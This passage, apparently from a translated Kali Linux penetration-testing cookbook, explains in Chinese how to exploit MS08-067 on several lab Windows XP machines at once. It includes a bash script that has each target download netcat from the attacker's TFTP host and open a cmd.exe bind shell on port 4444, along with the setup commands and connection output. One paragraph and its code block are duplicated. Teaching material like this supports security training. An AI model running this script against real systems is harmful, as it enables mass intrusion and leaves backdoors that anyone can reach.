  \ `LPORT` 赋值使用递增值，可以同时执行多个反向 Meterpreter 壳。\n\n#### 使用后门可执行文件进行多线程 MSF 攻击\n\n本教程将演示如何使用\
  \ `bash` 跨多个系统利用同一个漏洞，并在每个系统上打开一个后门。该后门包括在目标系统上部署 `Netcat` 可执行文件，并打开一个监听服务，该服务将在接收连接后执行\
  \ `cmd.exe`。\n\n### 准备工作\n\n要使用本教程演示的脚本，你需要访问多个系统，且每个系统都具有可以使用 `Metasploit` 利用的相同漏洞。在提供的示例中，复制了一个运行漏洞版本\
  \ Windows XP 的虚拟机，生成了三个 `MS08-067` 漏洞实例。有关设置 Windows 系统的更多信息，请参考此书第 1 章“入门”中的`安装\
  \ Windows Server` 教程。此外，本部分需要使用 `VIM` 或 `Nano` 等文本编辑器向文件系统编写脚本。有关编写脚本的更多信息，请参考此书第\
  \ 1 章“入门”中的`使用文本编辑器 (VIM and Nano)` 教程。\n\n#### 如何实现……\n\n接下来的示例演示了如何使用 `bash` 脚本同时利用同一个漏洞的多个实例。该脚本特别可以通过引用\
  \ IP 地址输入列表来利用多个实例的 `MS08-067` NetAPI 漏洞：\n\n```bash\n#!/bin/bash\nif [ ! $1 ];\
  \ then echo \"Usage: #./script <host file>\"; exit; fi\niplist=$1\nfor ip in $(cat\
  \ $iplist)\ndo\ngnome-terminal -x msfcli exploit/windows/smb/ms08_067_netapi\nPAYLOAD=windows/exec\
  \ CMD=\"cmd.exe /c \\\"tftp -i 172.16.36.239 GET nc.exe && nc.exe -lvp 4444 -e cmd.exe\\\
  \"\" RHOST=$ip\necho \"Exploiting $ip and creating backdoor on TCP port 4444\"\n\
  done\n```\n\n此脚本与上一个教程中讨论的脚本不同，因为它在每个目标上都安装后门。在每个被利用的系统上，都会执行一个有效载负载，它使用集成的简单的文件传输协议\
  \ (`TFTP`) 客户端获取 `Netcat` 可执行文件，然后使用它在 TCP 端口 4444 上打开一个监听的 `cmd.exe` 终端服务。为了实现此功能，Kali\
  \ 系统上需要运行一个 `TFTP` 服务。可以通过执行以下命令完成：\n\n```bash\nroot@KaliLinux:~# atftpd --daemon\
  \ --port 69 /tmp\nroot@KaliLinux:~# cp /usr/share/windows-binaries/nc.exe /tmp/nc.exe\n\
  ```\n\n第一条命令在 UDP 端口 69 上启动 `TFTP` 服务，服务目录为 `/tmp`。第二个命令用于从 `windows-binaries` 文件夹将\
  \ `Netcat` 可执行文件复制到 `TFTP` 目录。现在我们执行 `./multipwn.sh` bash 壳：\n\n```bash\nroot@KaliLinux:~#\
  \ ./multipwn.sh\nUsage: #./script <host file>\nroot@KaliLinux:~# ./multipwn.sh iplist.txt\n\
  Exploiting 172.16.36.132 and creating backdoor on TCP port 4444\nExploiting 172.16.36.158\
  \ and creating backdoor on TCP port 4444\nExploiting 172.16.36.225 and creating\
  \ backdoor on TCP port 4444\n```\n\n如果执行脚本时未提供任何参数，脚本将输出相应的用法说明。该用法说明将指示执行脚本时带有一个参数，指定包含目标\
  \ IP 地址列表的文本文件名。一旦使用此参数执行，一系列新终端将开始弹出。这些终端中的每一个都将运行输入列表中一个 IP 地址的漏洞利用序列。原始执行终端将随着进程的执行输出进程列表，并指示在每个终端上将创建一个后门。在每个终端的漏洞利用序列完成后，可以使用\
  \ `Netcat` 连接到有效载负载打开的远程服务：\n\n```bash\nroot@KaliLinux:~# nc -nv 172.16.36.225 4444\n\
  (UNKNOWN) [172.16.36.225] 4444 (?) open\nMicrosoft Windows XP [Version 5.1]\n(UNKNOWN)\
  \ [172.16.36.225] 4444 (?) open\nMicrosoft Windows XP [Version 5.1]\n(UNKNOWN) [172.16.36.225]\
  \ 4444 (?) open\nMicrosoft Windows XP [Version 5.1]\n```\n\n如果在执行脚本时没有提供任何参数，脚本将输出正确的用法说明。该用法说明将指示执行脚本时应带有一个参数，指定包含目标\
  \ IP 地址列表的文本文件名。一旦使用此参数执行，一系列新终端将开始弹出。这些终端中的每一个都将运行输入列表中一个 IP 地址的漏洞利用序列。原始执行终端将随着进程的执行输出进程列表，并指示在每个终端上将创建一个后门。在每个终端的漏洞利用序列完成后，可以使用\
  \ `Netcat` 连接到有效载负载打开的远程服务：\n\n```bash\nroot@KaliLinux:~# nc -nv 172.16.36.225 4444\n\
  (UNKNOWN) [172.16.36.225] 4444 (?) open\nMicrosoft Windows XP [Version 5.1]\n(UNKNOWN)\
  \ [172.16.36.225] 4444 (?) open\nMicrosoft Windows XP [Version 5.1]\n(UNKNOWN) [172.16.36.225]\
  \ 4444 (?) open\nMicrosoft Windows XP [Version 5.1]\n```\n\n### 工作原理……\n\n`Netcat`\
  \ 是一个功能强大的工具，可以用于各种目的。虽然这种技术可以用于 TCP 端口的建立连接，但不建议在生产系统上使用这种技术，因为由 `Netcat` 打开的后门可以被任何人访问。\n\
  \n#### 使用 ICMP 验证进行多线程 MSF 攻击\n\n本教程将演示如何使用 `bash` 跨多个系统利用同一个漏洞，并使用 `ICMP` 流量验证漏洞。这种技术开销很小，可以收集漏洞系统。\n\
  \n### 准备工作\n\n要使用本教程演示的脚本，你需要访问多个系统，且每个系统都具有可以使用 `Metasploit` 利用的相同漏洞。在提供的示例中，复制了一个运行漏洞版本\
  \ Windows XP 的虚拟机，生成了三个 `MS08-067` 漏洞实例。有关设置 Windows 系统的更多信息，请参考此书第 1 章“入门”中的`安装\
